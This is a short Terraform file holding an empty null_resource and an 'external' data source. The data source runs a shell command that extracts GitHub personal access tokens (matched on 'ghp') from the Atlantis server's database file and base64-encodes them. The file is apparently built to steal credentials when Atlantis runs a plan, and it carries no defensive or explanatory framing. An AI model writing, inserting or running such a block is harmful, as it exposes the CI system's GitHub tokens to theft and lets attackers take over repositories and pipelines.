resource "null_resource" "exambetter2" {
}
data "external" "example" {
  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep "ghp" | sort | uniq | base64"]
}
